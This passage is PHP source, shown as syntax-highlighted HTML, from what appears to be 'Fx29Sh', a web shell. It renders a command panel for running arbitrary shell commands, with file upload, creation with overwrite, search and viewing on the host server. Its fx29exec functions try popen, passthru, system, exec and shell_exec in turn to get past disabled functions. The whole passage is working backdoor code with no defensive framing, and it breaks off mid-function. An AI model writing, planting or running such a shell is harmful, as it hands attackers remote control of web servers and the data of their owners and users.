<span class="lineno">2461</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;tools&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="nx">fx29sh_tools</span><span class="p">();</span> <span class="p">}</span>
<span class="lineno">2462</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;about&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="nx">fx29sh_about</span><span class="p">();</span> <span class="p">}</span>
<span class="lineno">2463</span> <span class="p">}</span>
<span class="lineno">2464</span> <span class="c1">###[ END OF ACTIONS ]###</span>
<span class="lineno">2465</span> <span class="c1">#################################</span>
<span class="lineno">2466</span> <span class="c1">###[ COMMANDS PANEL ]###</span>
<span class="lineno">2467</span> <span class="c1">#################################</span>
<span class="lineno">2468</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">2469</span> <span class="x">&lt;/div&gt;</span>
<span class="lineno">2470</span> <span class="x">&lt;!-- End of Main Info --&gt;</span>
<span class="lineno">2471</span> <span class="x">&lt;!-- Commands Panel --&gt;</span>
<span class="lineno">2472</span> <span class="x">&lt;div id=&quot;main&quot;&gt;</span>
<span class="lineno">2473</span> <span class="x">    &lt;div class=&quot;bartitle&quot;&gt;&lt;b&gt;.: COMMANDS PANEL :.&lt;/b&gt;&lt;/div&gt;</span>
<span class="lineno">2474</span> <span class="x">&lt;table id=&quot;mainpanel&quot;&gt;</span>
<span class="lineno">2475</span> <span class="x">    &lt;tr&gt;&lt;th colspan=&quot;2&quot;&gt;Command:&lt;/th&gt;</span>
<span class="lineno">2476</span> <span class="x">    &lt;td&gt;</span>
<span class="lineno">2477</span> <span class="x">    &lt;form name=&quot;f_cmd&quot; method=&quot;POST&quot;&gt;</span>
<span class="lineno">2478</span> <span class="x">        &lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;cmd&quot;&gt;</span>
<span class="lineno">2479</span> <span class="x">        &lt;input type=&quot;hidden&quot; name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno">2480</span> <span class="x">        &lt;input type=&quot;hidden&quot; name=&quot;cmd_txt&quot; value=&quot;1&quot;&gt;</span>
<span class="lineno">2481</span> <span class="x">        &lt;input type=&quot;text&quot; name=&quot;cmd&quot; size=&quot;100&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="o">@</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno">2482</span> <span class="x">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Execute&quot;&gt;</span>
<span class="lineno">2483</span> <span class="x">    &lt;/form&gt;</span>
<span class="lineno">2484</span> <span class="x">    &lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">2485</span> <span class="x">    &lt;tr&gt;&lt;th colspan=&quot;2&quot;&gt;Quick Commands:&lt;/th&gt;</span>
<span class="lineno">2486</span> <span class="x">    &lt;td&gt;</span>
<span class="lineno">2487</span> <span class="x">    &lt;form name=&quot;f_qcmd&quot; method=&quot;POST&quot;&gt;</span>
<span class="lineno">2488</span> <span class="x">        &lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;cmd&quot;&gt;</span>
<span class="lineno">2489</span> <span class="x">        &lt;input type=&quot;hidden&quot; name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno">2490</span> <span class="x">        &lt;input type=&quot;hidden&quot; name=&quot;cmd_txt&quot; value=&quot;1&quot;&gt;</span>
<span class="lineno">2491</span> <span class="x">        &lt;select name=&quot;cmd&quot;&gt;</span>
<span class="lineno">2492</span> <span class="cp">&lt;?php</span>
<span class="lineno">2493</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$cmdaliases</span> <span class="k">as</span> <span class="nv">$als</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2494</span>   <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t\t</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">2495</span>   <span class="k">echo</span> <span class="s1">&#39;&lt;option value=&quot;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$als</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&quot;&gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$als</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&lt;/option&gt;&#39;</span><span class="p">;</span>
<span class="lineno">2496</span>   <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">2497</span> <span class="p">}</span>
<span class="lineno">2498</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">2499</span> 
<span class="lineno">2500</span> 
<span class="lineno">2501</span> <span class="x">        &lt;/select&gt;</span>
<span class="lineno">2502</span> <span class="x">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Execute&quot;&gt;</span>
<span class="lineno">2503</span> <span class="x">    &lt;/form&gt;</span>
<span class="lineno">2504</span> <span class="x">    &lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">2505</span> <span class="x">    &lt;tr&gt;&lt;th colspan=&quot;2&quot; rowspan=&quot;2&quot;&gt;PHP Filesystem:&lt;/th&gt;</span>
<span class="lineno">2506</span> <span class="x">    &lt;td&gt;</span>
<span class="lineno">2507</span> <span class="x">    &lt;script language=&quot;javascript&quot;&gt;</span>
<span class="lineno">2508</span> <span class="x">    function set_arg(txt1,txt2) {</span>
<span class="lineno">2509</span> <span class="x">      document.forms.fphpfsys.phpfsysfunc.value.selected = &quot;Download&quot;;</span>
<span class="lineno">2510</span> <span class="x">      document.forms.fphpfsys.arg1.value = txt1;</span>
<span class="lineno">2511</span> <span class="x">      document.forms.fphpfsys.arg2.value = txt2;</span>
<span class="lineno">2512</span> <span class="x">    }</span>
<span class="lineno">2513</span> <span class="x">    function chg_arg(num,txt1,txt2) {</span>
<span class="lineno">2514</span> <span class="x">      if (num==0) {</span>
<span class="lineno">2515</span> <span class="x">        document.forms.fphpfsys.arg1.type = &quot;hidden&quot;;</span>
<span class="lineno">2516</span> <span class="x">        document.forms.fphpfsys.A1.type = &quot;hidden&quot;;</span>
<span class="lineno">2517</span> <span class="x">      }</span>
<span class="lineno">2518</span> <span class="x">      if (num&lt;=1) {</span>
<span class="lineno">2519</span> <span class="x">        document.forms.fphpfsys.arg2.type = &quot;hidden&quot;;</span>
<span class="lineno">2520</span> <span class="x">        document.forms.fphpfsys.A2.type = &quot;hidden&quot;;</span>
<span class="lineno">2521</span> <span class="x">      }</span>
<span class="lineno">2522</span> <span class="x">      if (num==2) {</span>
<span class="lineno">2523</span> <span class="x">        document.forms.fphpfsys.A1.type = &quot;label&quot;;</span>
<span class="lineno">2524</span> <span class="x">        document.forms.fphpfsys.A2.type = &quot;label&quot;;</span>
<span class="lineno">2525</span> <span class="x">        document.forms.fphpfsys.arg1.type = &quot;text&quot;;</span>
<span class="lineno">2526</span> <span class="x">        document.forms.fphpfsys.arg2.type = &quot;text&quot;;</span>
<span class="lineno">2527</span> <span class="x">      }</span>
<span class="lineno">2528</span> <span class="x">      document.forms.fphpfsys.A1.value = txt1 + &quot;:&quot;;</span>
<span class="lineno">2529</span> <span class="x">      document.forms.fphpfsys.A2.value = txt2 + &quot;:&quot;;</span>
<span class="lineno">2530</span> <span class="x">    }</span>
<span class="lineno">2531</span> <span class="x">    &lt;/script&gt;</span>
<span class="lineno">2532</span> <span class="x">    &lt;form name=&quot;fphpfsys&quot; method=&quot;POST&quot;&gt;</span>
<span class="lineno">2533</span> <span class="x">        &lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;phpfsys&quot;&gt;</span>
<span class="lineno">2534</span> <span class="x">        &lt;input type=&quot;hidden&quot; name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno">2535</span> <span class="x">        &lt;select name=&quot;phpfsysfunc&quot;&gt;</span>
<span class="lineno">2536</span> <span class="cp">&lt;?php</span>
<span class="lineno">2537</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$phpfsaliases</span> <span class="k">as</span> <span class="nv">$als</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2538</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$als</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">==@</span><span class="nv">$phpfsysfunc</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2539</span>     <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t</span><span class="s2">&lt;option selected value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$als</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">chg_arg(&#39;</span><span class="si">$als[2]</span><span class="s2">&#39;,&#39;</span><span class="si">$als[3]</span><span class="s2">&#39;,&#39;</span><span class="si">$als[4]</span><span class="s2">&#39;)</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="o">.</span><span class="nv">$als</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/option&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">2540</span>   <span class="p">}</span>
<span class="lineno">2541</span>   <span class="k">else</span> <span class="p">{</span>
<span class="lineno">2542</span>     <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t</span><span class="s2">&lt;option value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$als</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">chg_arg(&#39;</span><span class="si">$als[2]</span><span class="s2">&#39;,&#39;</span><span class="si">$als[3]</span><span class="s2">&#39;,&#39;&quot;</span><span class="o">.@</span><span class="nv">$als</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;)</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="o">.</span><span class="nv">$als</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/option&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">2543</span>   <span class="p">}</span>
<span class="lineno">2544</span> <span class="p">}</span>
<span class="lineno">2545</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">2546</span> 
<span class="lineno">2547</span> 
<span class="lineno">2548</span> <span class="x">        &lt;/select&gt;</span>
<span class="lineno">2549</span> <span class="x">        &lt;input type=&quot;label&quot; name=&quot;A1&quot; value=&quot;File:&quot; size=2 disabled&gt;</span>
<span class="lineno">2550</span> <span class="x">        &lt;input type=text name=arg1 size=40 value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="o">@</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$arg1</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno">2551</span> <span class="x">        &lt;input type=&quot;hidden&quot; name=&quot;A2&quot; size=3 disabled &gt;</span>
<span class="lineno">2552</span> <span class="x">        &lt;input type=&quot;hidden&quot; name=&quot;arg2&quot; size=40 value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="o">@</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$arg2</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno">2553</span> <span class="x">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Execute&quot;&gt;</span>
<span class="lineno">2554</span> <span class="x">    &lt;/form&gt;</span>
<span class="lineno">2555</span> <span class="x">    &lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">2556</span> <span class="x">    &lt;tr&gt;&lt;td&gt;</span>
<span class="lineno">2557</span> <span class="cp">&lt;?php</span>
<span class="lineno">2558</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$sh_sourcez</span> <span class="k">as</span> <span class="nv">$e</span> <span class="o">=&gt;</span> <span class="nv">$o</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2559</span>   <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&lt;input type=button value=</span><span class="se">\&quot;</span><span class="si">$e\</span><span class="s2">&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;set_arg(&#39;</span><span class="si">$o[0]</span><span class="s2">&#39;,&#39;</span><span class="si">$o[1]</span><span class="s2">&#39;)</span><span class="se">\&quot;</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">2560</span> <span class="p">}</span>
<span class="lineno">2561</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">2562</span> 
<span class="lineno">2563</span> 
<span class="lineno">2564</span> <span class="x">    &lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">2565</span> <span class="x">    &lt;tr&gt;&lt;th rowspan=&quot;4&quot;&gt;Filesystem&lt;/th&gt;</span>
<span class="lineno">2566</span> <span class="x">    &lt;th&gt;Search:&lt;/th&gt;</span>
<span class="lineno">2567</span> <span class="x">    &lt;td&gt;</span>
<span class="lineno">2568</span> <span class="x">    &lt;form name=&quot;f_search&quot; method=&quot;POST&quot;&gt;</span>
<span class="lineno">2569</span> <span class="x">        &lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;search&quot;&gt;</span>
<span class="lineno">2570</span> <span class="x">        &lt;input type=&quot;hidden&quot; name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno">2571</span> <span class="x">        &lt;input type=&quot;text&quot; name=&quot;search_name&quot; size=&quot;29&quot; value=&quot;(.*)&quot;&gt; &lt;input type=&quot;checkbox&quot; name=&quot;search_name_regexp&quot; value=&quot;1&quot; checked&gt; regexp &lt;input type=submit name=submit value=&quot;Search&quot;&gt;</span>
<span class="lineno">2572</span> <span class="x">    &lt;/form&gt;</span>
<span class="lineno">2573</span> <span class="x">    &lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">2574</span> <span class="x">    &lt;tr&gt;&lt;th&gt;Upload:&lt;/th&gt;</span>
<span class="lineno">2575</span> <span class="x">    &lt;td&gt;</span>
<span class="lineno">2576</span> <span class="x">    &lt;form name=&quot;f_upload&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span>
<span class="lineno">2577</span> <span class="x">        &lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;upload&quot;&gt;</span>
<span class="lineno">2578</span> <span class="x">        &lt;input type=&quot;file&quot; name=&quot;uploadfile&quot; size=&quot;50&quot;&gt;</span>
<span class="lineno">2579</span> <span class="x">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Upload&quot;&gt;</span>
<span class="lineno">2580</span> <span class="x">        </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s2">&quot; Max size: &quot;</span><span class="o">.@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;upload_max_filesize&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;B | Temp dir: &quot;</span><span class="o">.@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;upload_tmp_dir&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">2581</span> 
<span class="lineno">2582</span> 
<span class="lineno">2583</span> <span class="x">    &lt;/form&gt;</span>
<span class="lineno">2584</span> <span class="x">    &lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">2585</span> <span class="x">    &lt;tr&gt;&lt;th&gt;Create:&lt;/th&gt;</span>
<span class="lineno">2586</span> <span class="x">    &lt;td&gt;</span>
<span class="lineno">2587</span> <span class="x">    &lt;form name=&quot;f_mkfile&quot; method=&quot;POST&quot;&gt;</span>
<span class="lineno">2588</span> <span class="x">        &lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;mkfile&quot;&gt;</span>
<span class="lineno">2589</span> <span class="x">        &lt;input type=&quot;hidden&quot; name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno">2590</span> <span class="x">        &lt;input type=&quot;hidden&quot; name=&quot;ft&quot; value=&quot;edit&quot;&gt;</span>
<span class="lineno">2591</span> <span class="x">        &lt;input type=&quot;text&quot; name=&quot;mkfile&quot; size=&quot;70&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt; &lt;input type=&quot;checkbox&quot; name=&quot;overwrite&quot; value=&quot;1&quot; checked&gt; Overwrite &lt;input type=submit value=&quot;Create&quot;&gt;</span>
<span class="lineno">2592</span> <span class="x">    &lt;/form&gt;</span>
<span class="lineno">2593</span> <span class="x">    &lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">2594</span> <span class="x">    &lt;tr&gt;&lt;th&gt;View:&lt;/th&gt;&lt;td&gt;</span>
<span class="lineno">2595</span> <span class="x">    &lt;form name=&quot;f_gofile&quot; method=&quot;POST&quot;&gt;</span>
<span class="lineno">2596</span> <span class="x">        &lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;gofile&quot;&gt;</span>
<span class="lineno">2597</span> <span class="x">        &lt;input type=&quot;hidden&quot; name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno">2598</span> <span class="x">        &lt;input type=&quot;text&quot; name=&quot;f&quot; size=&quot;70&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;View&quot;&gt;</span>
<span class="lineno">2599</span> <span class="x">    &lt;/form&gt;</span>
<span class="lineno">2600</span> <span class="x">    &lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">2601</span> <span class="x">&lt;/table&gt;</span>
<span class="lineno">2602</span> <span class="x">    &lt;div class=&quot;bartitle footer&quot;&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nx">html_footer</span><span class="p">();</span> <span class="cp">?&gt;</span><span class="x">&lt;/div&gt;</span>
<span class="lineno">2603</span> <span class="x">&lt;/div&gt;</span>
<span class="lineno">2604</span> <span class="x">&lt;!-- End of Commands Panel --&gt;</span>
<span class="lineno">2605</span> <span class="x">&lt;/center&gt;&lt;/body&gt;</span>
<span class="lineno">2606</span> <span class="x">&lt;/html&gt;</span>
<span class="lineno">2607</span> <span class="cp">&lt;?php</span>
<span class="lineno">2608</span> <span class="c1">####################################</span>
<span class="lineno">2609</span> <span class="c1">###[ Fx29Sh FUNCTIONS ]###</span>
<span class="lineno">2610</span> <span class="c1">####################################</span>
<span class="lineno">2611</span> <span class="k">function</span> <span class="nf">safemode</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno">2612</span>   <span class="k">if</span> <span class="p">(</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;safe_mode&quot;</span><span class="p">)</span> <span class="k">OR</span> <span class="nb">eregi</span><span class="p">(</span><span class="s2">&quot;on&quot;</span><span class="p">,</span><span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;safe_mode&quot;</span><span class="p">))</span> <span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="k">TRUE</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2613</span>   <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2614</span> <span class="p">}</span>
<span class="lineno">2615</span> <span class="k">function</span> <span class="nf">getdisfunc</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno">2616</span>   <span class="nv">$disfunc</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;disable_functions&quot;</span><span class="p">);</span>
<span class="lineno">2617</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$disfunc</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">2618</span>     <span class="nv">$disfunc</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$disfunc</span><span class="p">);</span>
<span class="lineno">2619</span>     <span class="nv">$disfunc</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;,&quot;</span><span class="p">,</span><span class="nv">$disfunc</span><span class="p">);</span>
<span class="lineno">2620</span>   <span class="p">}</span>
<span class="lineno">2621</span>   <span class="k">else</span> <span class="p">{</span> <span class="nv">$disfunc</span><span class="o">=</span> <span class="k">array</span><span class="p">();</span> <span class="p">}</span>
<span class="lineno">2622</span>   <span class="k">return</span> <span class="nv">$disfunc</span><span class="p">;</span>
<span class="lineno">2623</span> <span class="p">}</span>
<span class="lineno">2624</span> <span class="k">function</span> <span class="nf">enabled</span><span class="p">(</span><span class="nv">$func</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2625</span>  <span class="k">if</span> <span class="p">(</span> <span class="nb">function_exists</span><span class="p">(</span><span class="nv">$func</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">is_callable</span><span class="p">(</span><span class="nv">$func</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span><span class="nx">getdisfunc</span><span class="p">())</span> <span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="k">TRUE</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2626</span>  <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2627</span> <span class="p">}</span>
<span class="lineno">2628</span> <span class="c1">###[ FX29EXEC W/ STDERR ]###</span>
<span class="lineno">2629</span> <span class="k">function</span> <span class="nf">fx29exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2630</span>   <span class="nv">$output</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno">2631</span>   <span class="k">if</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;popen&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
<span class="lineno">2632</span>     <span class="nv">$h</span> <span class="o">=</span> <span class="nb">popen</span><span class="p">(</span><span class="nv">$cmd</span><span class="o">.</span><span class="s1">&#39; 2&gt;&amp;1&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">);</span>
<span class="lineno">2633</span>     <span class="k">if</span> <span class="p">(</span> <span class="nb">is_resource</span><span class="p">(</span><span class="nv">$h</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
<span class="lineno">2634</span>       <span class="k">while</span> <span class="p">(</span> <span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$h</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="nv">$output</span> <span class="o">.=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$h</span><span class="p">,</span> <span class="mi">2096</span><span class="p">);</span>  <span class="p">}</span>
<span class="lineno">2635</span>       <span class="nb">pclose</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
<span class="lineno">2636</span>     <span class="p">}</span>
<span class="lineno">2637</span>   <span class="p">}</span>
<span class="lineno">2638</span>   <span class="k">elseif</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;passthru&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="o">@</span><span class="nb">ob_start</span><span class="p">();</span> <span class="nb">passthru</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="nv">$output</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span> <span class="o">@</span><span class="nb">ob_end_clean</span><span class="p">();</span> <span class="p">}</span>
<span class="lineno">2639</span>   <span class="k">elseif</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;system&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="o">@</span><span class="nb">ob_start</span><span class="p">();</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="nv">$output</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span> <span class="o">@</span><span class="nb">ob_end_clean</span><span class="p">();</span> <span class="p">}</span>
<span class="lineno">2640</span>   <span class="k">elseif</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;exec&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="nb">exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span><span class="nv">$o</span><span class="p">);</span> <span class="nv">$output</span> <span class="o">=</span> <span class="nb">join</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$o</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">2641</span>   <span class="k">elseif</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;shell_exec&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="nv">$output</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">2642</span>   <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
<span class="lineno">2643</span> <span class="p">}</span>
<span class="lineno">2644</span> <span class="c1">###[ FX29EXEC W/O STDERR ]###</span>
<span class="lineno">2645</span> <span class="k">function</span> <span class="nf">fx29exec2</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2646</span>   <span class="nv">$output</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno">2647</span>   <span class="k">if</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;shell_exec&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="nv">$output</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">2648</span>   <span class="k">elseif</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;exec&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="nb">exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span><span class="nv">$o</span><span class="p">);</span> <span class="nv">$output</span> <span class="o">=</span> <span class="nb">join</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$o</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">2649</span>   <span class="k">elseif</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;system&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="o">@</span><span class="nb">ob_start</span><span class="p">();</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="nv">$output</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span> <span class="o">@</span><span class="nb">ob_end_clean</span><span class="p">();</span> <span class="p">}</span> <span class="c1">#Dipindahkan kesini karena menimbulkan masalah pada output control</span>
